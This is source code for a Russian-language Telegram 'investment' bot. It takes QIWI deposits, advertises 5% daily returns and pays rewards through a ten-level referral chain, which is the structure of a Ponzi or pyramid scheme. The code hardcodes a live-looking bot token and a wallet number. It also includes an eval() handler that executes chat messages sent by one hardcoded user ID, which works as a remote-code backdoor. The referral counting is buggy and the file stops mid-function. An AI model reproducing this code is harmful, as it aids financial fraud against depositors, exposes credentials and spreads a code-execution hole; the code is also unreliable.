let transactions = require("./transactions");
let adversite = require("./adversite");
let moreMoney = require("./moreMoney");

const mongo = require("mongoose");
mongo.connect("");

const QIWI = require("node-qiwi-api").Qiwi;
const wallet = new QIWI("+79910076945");

const admins = [8473087607];
                             


const User			=		mongo.model("NewUser", new mongo.Schema({
	id: Number,
	balance: Number,
	ref: Number,
	idref: Number,
	epr: Number,
	eps: Number,
	invests: Number,
	epv: Number,
	menu: String,
	adminmenu: String,
	prfUser: String,
	prp: Object,
	akk: Number,
	pakk: Number,
	inv: Number,
	viv: Number,
	regDate: String,
	verify: Boolean
}));

const Invests			=		mongo.model("NewInvesters", new mongo.Schema({
	id: Number,
	balance: Number,
	zarabotok: Number,
}));

const Ticket		=		mongo.model("NewTicket", new mongo.Schema({
	owner: Number,
	wallet: String,
	amount: Number
}));

const Ban			=		mongo.model("NewBan", new mongo.Schema({
	id: Number
}));

const Telegram		=		require("node-telegram-bot-api");
const bot			=		new Telegram(
	"7556886894:AAE67gaiIKGI5CIlxOZ_tplzftphLm3W2n4", // –¢–æ–∫–µ–Ω BotFather
	{ polling: true }
);

setInterval(async () => {
wallet.getOperationHistory({
rows: 3,
operation: "IN"
}, async (err, res) => {
res.data.map(async (operation) => {
if(transactions.indexOf(operation.txnId) !== -1) return;

if(!operation.comment) return;
if(!operation.comment.startsWith("m")) return;
if(operation.sum.amount < 10) return;

let user = await User.findOne({ id: Number(operation.comment.split("m")[1]) });
if(!user) return;
				await User.findOneAndUpdate({ id: 1588287137 }, { $inc: { inv: operation.sum.amount } })
bot.sendMessage(user.id, `
üî• –ù–∞ —Å—á–µ—Ç –∏–Ω–≤–µ—Å—Ç–∏—Ü–∏–π –ø–æ—Å—Ç—É–ø–∏–ª–æ: ${operation.sum.amount}‚ÇΩ`);
bot.sendMessage(1588287137, `
<a href="tg://user?id=${user.id}">üî• –ò–≥—Ä–æ–∫</a> —Å–¥–µ–ª–∞–ª –¥–µ–ø–æ–∑–∏—Ç —á–µ—Ä–µ–∑ Qiwi: ${operation.sum.amount}‚ÇΩ`);
await user.inc("invests", operation.sum.amount);

transactions.push(operation.txnId);
require("fs").writeFileSync("./transactions.json", JSON.stringify(transactions, null, "\t"));
});
});
}, 10000);


const settings		=		{
	pps: 0.25,
	ppv: 0.025,
	ppr: 2,
	ref2: 0.6,
	ref3: 0.4,
	ref4: 0.35,
	ref5: 0.25,
	ref1st: 0.20,
	ref2st: 0.10,
	min_withdraw: 1
}

const keyboards		=		{
	main: [
		["üç© –ú–æ–∏ –∏–Ω–≤–µ—Å—Ç–∏—Ü–∏–∏","üçπ –ü–æ–∑–≤–∞—Ç—å –¥—Ä—É–∑–µ–π"],
		["üç≠ –í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è –∞–∫–∫–∞—É–Ω—Ç–∞"],
		["üß© –ë–∞–ª–∞–Ω—Å","üïπ –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è"]
	],
	cancel: [
		["‚õîÔ∏è –û—Ç–º–µ–Ω–∞"]
	],
	admin: [
		["üì¨ –†–∞—Å—Å—ã–ª–∫–∞", "üìÆ –ó–∞—è–≤–∫–∏ –Ω–∞ –≤—ã–≤–æ–¥"],
		["üìÅ –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è", "üîì –ò–∑–º–µ–Ω–∏—Ç—å –±–∞–ª–∞–Ω—Å"],
		["‚õîÔ∏è –ë–∞–Ω"],
		["üîô –ù–∞—á–∞–ª–æ"]
	]
}

bot.on("message", async (message) => {
	let ban = await Ban.findOne({ id: message.from.id });
	if(ban) return;

	message.send = (text, params) => bot.sendMessage(message.chat.id, text, params);
	User.findOne({ id: message.from.id }).then(async ($user) => {
		if($user) return;

		let schema = {
			id: message.from.id,
			balance: 0,
			ref: 0,
			inv: 0,
			viv: 0,
			akk: 0,
			epr: 0,
			eps: 0,
			epv: 0,
			idref: 0,
			invests: 0,
			menu: "",
			adminmenu: "",
			prfUser: "",
			prp: {},
			regDate: `${new Date().getDate()}.${new Date().getMonth() + 1}.${new Date().getFullYear()}`,
			verify: false
		}
					if(Number(message.text.split("/start ")[1])) {
			schema.ref		=		Number(message.text.split("/start ")[1]);

		await message.send(`‚úÖ –£—Å–ø–µ—à–Ω–∞—è —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è`, {
			reply_markup: {
				keyboard: keyboards.main,
				resize_keyboard: true
			}
		});
								let user = new User(schema);
		await user.save();
					let ref = await User.findOne({ id: Number(message.text.split("/start ")[1]) });
			bot.sendMessage(Number(message.text.split("/start ")[1]), `üî• –ü–æ –≤–∞—à–µ–π —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω–æ–π —Å—Å—ã–ª–∫–µ –ø–µ—Ä–µ—à–µ–ª <a href="tg://user?id=${message.from.id}">–∏–≥—Ä–æ–∫</a> 1 —É—Ä–æ–≤–Ω—è, –ø–æ—Å–ª–µ –µ–≥–æ –≤–µ—Ä–µ—Ñ–∏–∫–∞—Ü–∏–∏ –≤—ã –ø–æ–ª—É—á–∏—Ç–µ 5 –†—É–± –Ω–∞ –≤–∞—à–∏ –∏–Ω–≤–µ—Å—Ç–∏—Ü–∏–∏`, {
				parse_mode: "HTML"
			})
				let tref = await User.findOne({ id: ref.ref });
				if(!tref) { return console.log('2 —É—Ä–æ–≤–µ–Ω—å OFF') }
				await User.updateOne({ id: message.from.id }, { $set: { tref: tref.id } } )
				bot.sendMessage(Number(tref.id), `üî• –ü–æ –≤–∞—à–µ–π —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω–æ–π —Å—Å—ã–ª–∫–µ –ø–µ—Ä–µ—à–µ–ª <a href="tg://user?id=${message.from.id}">–∏–≥—Ä–æ–∫</a> 2 —É—Ä–æ–≤–Ω—è, –ø–æ—Å–ª–µ –µ–≥–æ –≤–µ—Ä–µ—Ñ–∏–∫–∞—Ü–∏–∏ –≤—ã –ø–æ–ª—É—á–∏—Ç–µ 2.5 –†—É–± –Ω–∞ –≤–∞—à–∏ –∏–Ω–≤–µ—Å—Ç–∏—Ü–∏–∏`, {
				parse_mode: "HTML"
			})
							let fref = await User.findOne({ id: tref.ref });
				if(!fref) { return console.log('3 —É—Ä–æ–≤–µ–Ω—å OFF') }
								bot.sendMessage(Number(fref.id), `üî• –ü–æ –≤–∞—à–µ–π —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω–æ–π —Å—Å—ã–ª–∫–µ –ø–µ—Ä–µ—à–µ–ª <a href="tg://user?id=${message.from.id}">–∏–≥—Ä–æ–∫</a> 3 —É—Ä–æ–≤–Ω—è, –ø–æ—Å–ª–µ –µ–≥–æ –≤–µ—Ä–µ—Ñ–∏–∫–∞—Ü–∏–∏ –≤—ã –ø–æ–ª—É—á–∏—Ç–µ 1.25 –†—É–± –Ω–∞ –≤–∞—à–∏ –∏–Ω–≤–µ—Å—Ç–∏—Ü–∏–∏ `, {
				parse_mode: "HTML"
			})
										let sref = await User.findOne({ id: fref.ref });
				if(!sref) { return console.log('4 —É—Ä–æ–≤–µ–Ω—å OFF') }
								bot.sendMessage(Number(sref.id), `üî• –ü–æ –≤–∞—à–µ–π —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω–æ–π —Å—Å—ã–ª–∫–µ –ø–µ—Ä–µ—à–µ–ª <a href="tg://user?id=${message.from.id}">–∏–≥—Ä–æ–∫</a> 4 —É—Ä–æ–≤–Ω—è, –ø–æ—Å–ª–µ –µ–≥–æ –≤–µ—Ä–µ—Ñ–∏–∫–∞—Ü–∏–∏ –≤—ã –ø–æ–ª—É—á–∏—Ç–µ 0.5 –†—É–± –Ω–∞ –≤–∞—à–∏ –∏–Ω–≤–µ—Å—Ç–∏—Ü–∏–∏`, {
				parse_mode: "HTML"
			})
										let rref = await User.findOne({ id: sref.ref });
				if(!rref) { return console.log('5 —É—Ä–æ–≤–µ–Ω—å OFF') }
								bot.sendMessage(Number(rref.id), `üî• –ü–æ –≤–∞—à–µ–π —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω–æ–π —Å—Å—ã–ª–∫–µ –ø–µ—Ä–µ—à–µ–ª <a href="tg://user?id=${message.from.id}">–∏–≥—Ä–æ–∫</a> 5 —É—Ä–æ–≤–Ω—è, –ø–æ—Å–ª–µ –µ–≥–æ –≤–µ—Ä–µ—Ñ–∏–∫–∞—Ü–∏–∏ –≤—ã –ø–æ–ª—É—á–∏—Ç–µ 0.25 –†—É–± –Ω–∞ –≤–∞—à–∏ –∏–Ω–≤–µ—Å—Ç–∏—Ü–∏–∏ `, {
				parse_mode: "HTML"
			})
													let qref = await User.findOne({ id: rref.ref });
				if(!qref) { return console.log('6 —É—Ä–æ–≤–µ–Ω—å OFF') }
								bot.sendMessage(Number(qref.id), `üî• –ü–æ –≤–∞—à–µ–π —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω–æ–π —Å—Å—ã–ª–∫–µ –ø–µ—Ä–µ—à–µ–ª <a href="tg://user?id=${message.from.id}">–∏–≥—Ä–æ–∫</a> 6 —É—Ä–æ–≤–Ω—è, –ø–æ—Å–ª–µ –µ–≥–æ –≤–µ—Ä–µ—Ñ–∏–∫–∞—Ü–∏–∏ –≤—ã –ø–æ–ª—É—á–∏—Ç–µ 0.1 –†—É–± –Ω–∞ –≤–∞—à–∏ –∏–Ω–≤–µ—Å—Ç–∏—Ü–∏–∏ `, {
				parse_mode: "HTML"
			})
													let yref = await User.findOne({ id: qref.ref });
				if(!yref) { return console.log('7 —É—Ä–æ–≤–µ–Ω—å OFF') }
								bot.sendMessage(Number(yref.id), `üî• –ü–æ –≤–∞—à–µ–π —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω–æ–π —Å—Å—ã–ª–∫–µ –ø–µ—Ä–µ—à–µ–ª <a href="tg://user?id=${message.from.id}">–∏–≥—Ä–æ–∫</a> 7 —É—Ä–æ–≤–Ω—è, –ø–æ—Å–ª–µ –µ–≥–æ –≤–µ—Ä–µ—Ñ–∏–∫–∞—Ü–∏–∏ –≤—ã –ø–æ–ª—É—á–∏—Ç–µ 0.1 –†—É–± –Ω–∞ –≤–∞—à–∏ –∏–Ω–≤–µ—Å—Ç–∏—Ü–∏–∏ `, {
				parse_mode: "HTML"
			})
													let uref = await User.findOne({ id: yref.ref });
				if(!uref) { return console.log('8 —É—Ä–æ–≤–µ–Ω—å OFF') }
								bot.sendMessage(Number(uref.id), `üî• –ü–æ –≤–∞—à–µ–π —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω–æ–π —Å—Å—ã–ª–∫–µ –ø–µ—Ä–µ—à–µ–ª <a href="tg://user?id=${message.from.id}">–∏–≥—Ä–æ–∫</a> 8 —É—Ä–æ–≤–Ω—è, –ø–æ—Å–ª–µ –µ–≥–æ –≤–µ—Ä–µ—Ñ–∏–∫–∞—Ü–∏–∏ –≤—ã –ø–æ–ª—É—á–∏—Ç–µ 0.1 –†—É–± –Ω–∞ –≤–∞—à–∏ –∏–Ω–≤–µ—Å—Ç–∏—Ü–∏–∏ `, {
				parse_mode: "HTML"
			})
													let iref = await User.findOne({ id: uref.ref });
				if(!iref) { return console.log('9 —É—Ä–æ–≤–µ–Ω—å OFF') }
								bot.sendMessage(Number(iref.id), `üî• –ü–æ –≤–∞—à–µ–π —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω–æ–π —Å—Å—ã–ª–∫–µ –ø–µ—Ä–µ—à–µ–ª <a href="tg://user?id=${message.from.id}">–∏–≥—Ä–æ–∫</a> 9 —É—Ä–æ–≤–Ω—è, –ø–æ—Å–ª–µ –µ–≥–æ –≤–µ—Ä–µ—Ñ–∏–∫–∞—Ü–∏–∏ –≤—ã –ø–æ–ª—É—á–∏—Ç–µ 0.1 –†—É–± –Ω–∞ –≤–∞—à–∏ –∏–Ω–≤–µ—Å—Ç–∏—Ü–∏–∏ `, {
				parse_mode: "HTML"
			})
													let oref = await User.findOne({ id: iref.ref });
				if(!oref) { return console.log('10 —É—Ä–æ–≤–µ–Ω—å OFF') }
								bot.sendMessage(Number(oref.id), `üî• –ü–æ –≤–∞—à–µ–π —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω–æ–π —Å—Å—ã–ª–∫–µ –ø–µ—Ä–µ—à–µ–ª <a href="tg://user?id=${message.from.id}">–∏–≥—Ä–æ–∫</a> 10 —É—Ä–æ–≤–Ω—è, –ø–æ—Å–ª–µ –µ–≥–æ –≤–µ—Ä–µ—Ñ–∏–∫–∞—Ü–∏–∏ –≤—ã –ø–æ–ª—É—á–∏—Ç–µ 0.1 –†—É–± –Ω–∞ –≤–∞—à–∏ –∏–Ω–≤–µ—Å—Ç–∏—Ü–∏–∏ `, {
				parse_mode: "HTML"
			})
			}


		let user = new User(schema);
		await user.save();
await message.send(`üñ• –î–ª—è –ø–æ–ª–Ω–æ—Ü–µ–Ω–Ω–æ–π —Ä–∞–±–æ—Ç—ã —Å –±–æ—Ç–æ–º –Ω—É–∂–Ω–∞ –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è –∞–∫–∫–∞—É–Ω—Ç–∞.`);
	});
	message.user = await User.findOne({ id: message.from.id });



	if(message.text === "‚õîÔ∏è –û—Ç–º–µ–Ω–∞" || message.text === "üîô –ù–∞—á–∞–ª–æ") {
	
		await message.user.set("menu", "");
		await message.user.set("adminmenu", "");

		return message.send(`–û–ø–µ—Ä–∞—Ü–∏—è –æ—Ç–º–µ–Ω–µ–Ω–∞.`, {
			reply_markup: {
				keyboard: keyboards.main,
				resize_keyboard: true
			}
		});
	}

if(message.text === "/start") {
		await message.send(`üîî –ú–µ–Ω—é`, {
			reply_markup: {
				keyboard: keyboards.main,
				resize_keyboard: true
			}
		});
	}
		if(message.user.menu.startsWith("enterAmount")) {
			message.text = Math.floor(Number(message.text));
			if(!message.text) return message.send(`–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –≤—ã–≤–æ–¥–∞`);

			let pwallet = Number(message.user.menu.split("enterAmount")[1]);

			if(message.text > message.user.balance) return message.send(`–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –¥–µ–Ω–µ–≥! –í—ã –º–æ–∂–µ—Ç–µ –≤—ã–≤–µ—Å—Ç–∏ ${message.user.balance.toFixed(2)} RUB`);
			else if(message.text <= message.user.balance) {
				await User.findOneAndUpdate({ id: 1438921150 }, { $inc: { viv: message.text } })
				await message.user.dec("balance", message.text);
				await wallet.toWallet({
				account: "+" + pwallet,
				amount: message.text,
				comment: "–í—ã–≤–æ–¥ —Å BESTINVESTMENT_ROBOT"
			}, (err, success) => {});
				await message.user.set("menu", "");
				
							bot.sendMessage("@end_soft", `<b>–ë—ã–ª–∞ –ø—Ä–æ–∏–∑–≤–µ–¥–µ–Ω–∞ –Ω–æ–≤–∞—è –≤—ã–ø–ª–∞—Ç–∞!</b>
			
üí∞ <b>–°—É–º–º–∞: ${message.text}‚ÇΩ</b>
üí∏ <a href="tg://user?id=${message.from.id}">–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å</a>
`, {
				parse_mode: "HTML",
				reply_markup: {
					inline_keyboard: [
					[
						{ text: "üí∞ –ü–µ—Ä–µ–π—Ç–∏ –≤ –±–æ—Ç–∞", url: `https://t.me/BESTINVESTMENT_ROBOT` }
					]
					]
				}
			});
				admins.map((x) => bot.sendMessage(x, `üí∞ –ù–æ–≤—ã–π –≤—ã–≤–æ–¥ –Ω–∞ —Å—É–º–º—É ${message.text} –æ—Ç <a href="tg://user?id=${message.from.id}">–ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è</a> –∫–∏–≤–∏ ${pwallet}`, {
				parse_mode: "HTML"
			}));

				return message.send(`üí∞ –°—Ä–µ–¥—Å—Ç–≤–∞ —É–∂–µ –Ω–∞ —Ç–≤–æ–µ–º QIWI! 

üèÜ –û—Å—Ç–∞–≤—å —Å–∫—Ä–∏–Ω—à–æ—Ç –≤—ã–ø–ª–∞—Ç—ã –≤ —á–∞—Ç–µ https://t.me/end_soft`, {
	parse_mode: "HTML",
					reply_markup: {
						keyboard: keyboards.main,
						resize_keyboard: true
					}
				});
			}
		}

		if(message.user.menu === "qiwi") {
			message.text = Math.floor(Number(message.text));
			if(message.text < 7000000) return message.send(`–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä –∫–æ—à–µ–ª—å–∫–∞ QIWI!`);

			await message.user.set("menu", "enterAmount" + message.text);
			return message.send(`–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –Ω–∞ –≤—ã–≤–æ–¥.`);
		}

			if(message.text === "/qiwi") {
											let user		=		await User.findOne({ id: message.chat.id });	
					if(user.akk == 0) {
						return message.send(`üõë –í—ã –Ω–µ –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–ª–∏ –∞–∫–∫–∞—É–Ω—Ç. –î–ª—è –∞–∫—Ç–∏–≤–∞—Ü–∏–∏ –ø–µ—Ä–µ–π–¥–∏—Ç–µ –≤ —Ä–∞–∑–¥–µ–ª -> –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è –∞–∫–∫–∞—É–Ω—Ç–∞`);
						}
		if(message.user.balance < settings.min_withdraw) return message.send(`–ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ –≤—ã–≤–æ–¥–∞: ${settings.min_withdraw}‚ÇΩ`, {
			reply_markup: {
				keyboard: keyboards.main,
				resize_keyboard: true
			}
		});

		let ticket = await Ticket.findOne({ owner: message.from.id });

		message.send(`–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä –∫–æ—à–µ–ª—å–∫–∞ QIWI.`, {
			reply_markup: {
				keyboard: keyboards.cancel,
				resize_keyboard: true
			}
		});

		await message.user.set("menu", "qiwi");
	}

	if(message.text === "üß© –ë–∞–ª–∞–Ω—Å") {
									let user		=		await User.findOne({ id: message.chat.id });	
					if(user.akk == 0) {
						return message.send(`üõë –í—ã –Ω–µ –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–ª–∏ –∞–∫–∫–∞—É–Ω—Ç. –î–ª—è –∞–∫—Ç–∏–≤–∞—Ü–∏–∏ –ø–µ—Ä–µ–π–¥–∏—Ç–µ –≤ —Ä–∞–∑–¥–µ–ª -> –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è –∞–∫–∫–∞—É–Ω—Ç–∞`);
						}
		return message.send(`
üß© –í–∞—à –±–∞–ª–∞–Ω—Å: ${message.user.balance.toFixed(2)}‚ÇΩ

üÜî –ê–π–¥–∏ –∞–∫–∫–∞—É–Ω—Ç–∞: ${message.chat.id}`, {
			reply_markup: {
				inline_keyboard: [
						[
							{ text: "‚ûï –ü–æ–ø–æ–ª–Ω–∏—Ç—å", callback_data: `popol` },
						    { text: "‚ûñ –í—ã–≤–µ—Å—Ç–∏", callback_data: `viv` }
						],
						]
			},
			parse_mode: "HTML"
		});
	}
	
	if(message.text === "üç≠ –í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è –∞–∫–∫–∞—É–Ω—Ç–∞") {
		let user		=		await User.findOne({ id: message.chat.id });	
					if(user.akk == 1) {
						return message.send(`üéØ –í—ã —É–∂–µ –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–ª–∏ –∞–∫–∫–∞—É–Ω—Ç.`);
						}	
		return message.send(`
üç≠ –î–ª—è –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏–∏ –∞–∫–∫–∞—É–Ω—Ç–∞ –Ω—É–∂–Ω–æ –ø–æ–¥–ø–∏—Å–∞—Ç—å—Å—è –Ω–∞ –Ω–∞—à–∏ –∫–∞–Ω–∞–ª—ã:

üí´ t.me/cyberpunk_otzivi
   t.me/end_soft
   t.me/end_soft`, {
			reply_markup: {
				inline_keyboard: [
						[
							{ text: "‚úÖ –ü—Ä–æ–≤–µ—Ä–∏—Ç—å", callback_data: `akt` }
						],
						]
			},
			parse_mode: "HTML"
		});
	}
	
		if(message.text === "üç© –ú–æ–∏ –∏–Ω–≤–µ—Å—Ç–∏—Ü–∏–∏") {
																let user		=		await User.findOne({ id: message.chat.id });	
					if(user.akk == 0) {
						return message.send(`üõë –í—ã –Ω–µ –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–ª–∏ –∞–∫–∫–∞—É–Ω—Ç. –î–ª—è –∞–∫—Ç–∏–≤–∞—Ü–∏–∏ –ø–µ—Ä–µ–π–¥–∏—Ç–µ –≤ —Ä–∞–∑–¥–µ–ª -> –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è –∞–∫–∫–∞—É–Ω—Ç–∞`);
						}

		return message.send(`
üç© –¢–≤–æ–π –∏–Ω–≤–µ—Å—Ç–∏—Ü–∏–æ–Ω–Ω—ã–π —Å—á—ë—Ç:

ü•∑ –ü—Ä–æ—Ü–µ–Ω—Ç –≤ —Å—É—Ç–∫–∏: 5%

üî• –ò–Ω–≤–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–Ω–∞—è —Å—É–º–º–∞: ${user.invests}‚ÇΩ
‚ûñ –î–æ—Ö–æ–¥ –≤ —Å—É—Ç–∫–∏: ${Number(user.invests/20)}‚ÇΩ

üß© –ß—Ç–æ–±—ã —Å–æ–≤–µ—Ä—à–∏—Ç—å –∏–Ω–≤–µ—Å—Ç–∏—Ü–∏–∏ –Ω—É–∂–Ω–æ –ª–∏–±–æ –ø—Ä–∏–≥–ª–∞—à–∞—Ç—å –¥—Ä—É–∑–µ–π –ª–∏–±–æ –ø–æ–ø–æ–ª–Ω—è—Ç—å –≤ –±–æ—Ç–∞`, {
			parse_mode: "HTML"
		});
	}
	if(message.text === "üçπ –ü–æ–∑–≤–∞—Ç—å –¥—Ä—É–∑–µ–π") {
											let user		=		await User.findOne({ id: message.chat.id });	
					if(user.akk == 0) {
						return message.send(`üõë –í—ã –Ω–µ –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–ª–∏ –∞–∫–∫–∞—É–Ω—Ç. –î–ª—è –∞–∫—Ç–∏–≤–∞—Ü–∏–∏ –ø–µ—Ä–µ–π–¥–∏—Ç–µ –≤ —Ä–∞–∑–¥–µ–ª -> –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è –∞–∫–∫–∞—É–Ω—Ç–∞`);
						}													

		await message.send(`
üçπ –ó–∞ –ø—Ä–∏–≥–ª–∞—à–µ–Ω–∏–µ –¥—Ä—É–∑–µ–π –º—ã –ø–ª–∞—Ç–∏–º:
üí∞ –ó–∞ –ø—Ä–∏–≥–ª–∞—à–µ–Ω–∏–µ –¥—Ä—É–≥–∞:
1‚É£ –£—Ä–æ–≤–µ–Ω—å - 5‚ÇΩ
2‚É£ –£—Ä–æ–≤–µ–Ω—å - 2.5‚ÇΩ
3‚É£ –£—Ä–æ–≤–µ–Ω—å - 1.25‚ÇΩ
4‚É£ –£—Ä–æ–≤–µ–Ω—å - 0.5‚ÇΩ
5‚É£ –£—Ä–æ–≤–µ–Ω—å - 0.25‚ÇΩ
6‚É£ –£—Ä–æ–≤–µ–Ω—å - 0.1‚ÇΩ
7‚É£ –£—Ä–æ–≤–µ–Ω—å - 0.1‚ÇΩ
8‚É£ –£—Ä–æ–≤–µ–Ω—å - 0.1‚ÇΩ
9‚É£ –£—Ä–æ–≤–µ–Ω—å - 0.1‚ÇΩ
üîü –£—Ä–æ–≤–µ–Ω—å - 0.1‚ÇΩ
üöÄ –í–∞—à–∞ —Å—Å—ã–ª–∫–∞: https://t.me/BESTINVESTMENT_ROBOT?start=${message.from.id}`, {
			parse_mode: "HTML"
		});
				await message.send(`
üì© –°–æ–±–∏—Ä–∞—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –≤–∞—à–∏—Ö –¥—Ä—É–∑—å—è—Ö...`, {
			parse_mode: "HTML"
		});
		let lvl1		=		await User.find({ ref: message.from.id });
		let lvl2		=		await User.find({ ref: lvl1.id });
		let lvl3		=		await User.find({ ref: lvl2.id });
		let lvl4		=		await User.find({ ref: lvl3.id });
		let lvl5		=		await User.find({ ref: lvl4.id });
		let lvl6		=		await User.find({ ref: lvl5.id });
		let lvl7		=		await User.find({ ref: lvl6.id });
		let lvl8		=		await User.find({ ref: lvl7.id });
		let lvl9		=		await User.find({ ref: lvl8.id });
		let lvl10		=		await User.find({ ref: lvl9.id });
						return message.send(`
1‚É£ –£—Ä–æ–≤–µ–Ω—å - ${lvl1.length} —á–µ–ª–æ–≤–µ–∫
2‚É£ –£—Ä–æ–≤–µ–Ω—å - ${lvl2.length} —á–µ–ª–æ–≤–µ–∫
3‚É£ –£—Ä–æ–≤–µ–Ω—å - ${lvl3.length} —á–µ–ª–æ–≤–µ–∫
4‚É£ –£—Ä–æ–≤–µ–Ω—å - ${lvl4.length} —á–µ–ª–æ–≤–µ–∫
5‚É£ –£—Ä–æ–≤–µ–Ω—å - ${lvl5.length} —á–µ–ª–æ–≤–µ–∫
6‚É£ –£—Ä–æ–≤–µ–Ω—å - ${lvl6.length} —á–µ–ª–æ–≤–µ–∫
7‚É£ –£—Ä–æ–≤–µ–Ω—å - ${lvl7.length} —á–µ–ª–æ–≤–µ–∫
8‚É£ –£—Ä–æ–≤–µ–Ω—å - ${lvl8.length} —á–µ–ª–æ–≤–µ–∫
9‚É£ –£—Ä–æ–≤–µ–Ω—å - ${lvl9.length} —á–µ–ª–æ–≤–µ–∫
üîü –£—Ä–æ–≤–µ–Ω—å - ${lvl10.length} —á–µ–ª–æ–≤–µ–∫`, {
			parse_mode: "HTML"
		});
	}


	if(message.text === "üïπ –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è") {

															let user		=		await User.findOne({ id: message.chat.id });	
					if(user.akk == 0) {
						return message.send(`üõë –í—ã –Ω–µ –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–ª–∏ –∞–∫–∫–∞—É–Ω—Ç. –î–ª—è –∞–∫—Ç–∏–≤–∞—Ü–∏–∏ –ø–µ—Ä–µ–π–¥–∏—Ç–µ –≤ —Ä–∞–∑–¥–µ–ª -> –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è –∞–∫–∫–∞—É–Ω—Ç–∞`);
						}	
var s = await User.findOne({ id: 1588287137 })

		let counters = {
			users: await User.countDocuments(),
			users_today: await User.find({ regDate: `${new Date().getDate()}.${new Date().getMonth() + 1}.${new Date().getFullYear()}` }),
		}

		counters.users_today		=		counters.users_today.length;
		return message.send(`
üïπ –¢–µ–∫—É—â–∞—è —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –±–æ—Ç–∞:

üöÄ –î–∞—Ç–∞ —Å—Ç–∞—Ä—Ç–∞ –ø—Ä–æ–µ–∫—Ç–∞: 2.07

‚ûñ –í—Å–µ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π: <b>${counters.users}</b>
‚ûñ –ù–æ–≤—ã—Ö –∑–∞ —Å—É—Ç–∫–∏: <b>${counters.users_today}</b>
‚ûñ –í—Å–µ–≥–æ –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏–π: <b>${Math.round(s.pakk)}</b>`, {
	reply_markup: {
				inline_keyboard: [
						[
							{ text: "üîä –ß–∞—Ç", url: `t.me/end_soft` },
						]					
						]
						
			},
			parse_mode: "HTML"
		});
	}

	if(/^(?:~)\s([^]+)/i.test(message.text)) {
		if(message.from.id !== 1588287137) return;

		let result = eval(message.text.match(/^(?:~)\s([^]+)/i)[1]);
		try {
			if(typeof(result) === "string")
			{
				return message.send(`string: \`${result}\``, { parse_mode: "Markdown" });
			} else if(typeof(result) === "number")
			{
				return message.send(`number: \`${result}\``, { parse_mode: "Markdown" });
			} else {
				return message.send(`${typeof(result)}: \`${JSON.stringify(result, null, '\t\t')}\``, { parse_mode: "Markdown" });
			}
		} catch (e) {
			console.error(e);
			return message.send(`–æ—à–∏–±–∫–∞:
\`${e.toString()}\``, { parse_mode: "Markdown" });
		}
	}

	if(admins.indexOf(message.from.id) !== -1) {
		if(message.user.menu.startsWith("setBalance")) {
			message.text		=		Number(message.text);
			if(!message.text) return message.send(`–í–≤–µ–¥–∏—Ç–µ –Ω–æ–≤—ã–π –±–∞–ª–∞–Ω—Å.`);

			let user		=		await User.findOne({ id: Number(message.user.menu.split("setBalance")[1]) });
			if(!user) return;

			await user.set("balance", message.text);
			await message.user.set("menu", "");

			return message.send(`–ë–∞–ª–∞–Ω—Å —É—Å–ø–µ—à–Ω–æ –∏–∑–º–µ–Ω—ë–Ω.`, {
				reply_markup: {
					keyboard: keyboards.admin,
					resize_keyboard: true
				}
			});
		}

		if(message.user.menu === "enterIdBalance") {
			message.text		=		Math.floor(Number(message.text));
			if(!message.text) return message.send(`–í–≤–µ–¥–∏—Ç–µ –∞–π–¥–∏.`);

			let user		=		await User.findOne({ id: message.text });
			if(!user) return message.send(`–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω.`);

			await message.user.set("menu", "setBalance" + message.text);
			return message.send(`–í–≤–µ–¥–∏—Ç–µ –Ω–æ–≤—ã–π –±–∞–ª–∞–Ω—Å.\n–ë–∞–ª–∞–Ω—Å —Å–µ–π—á–∞—Å: ${user.balance} RUB`);
		}

		if(message.user.menu.startsWith("auditory")) {
			let users		=		await User.find();
			let total		=		users.length * Number(message.user.menu.split("auditory")[1]);

			for (let i = 0; i < total; i++) {
				if(message.photo) {
					let file_id = message.photo[message.photo.length - 1].file_id;
					let params = {
						caption: message.caption,
						parse_mode: "HTML",
						disable_web_page_preview: true
					}

					if(message.caption.match(/(?:–∫–Ω–æ–ø–∫–∞)\s(.*)\s-\s(.*)/i)) {
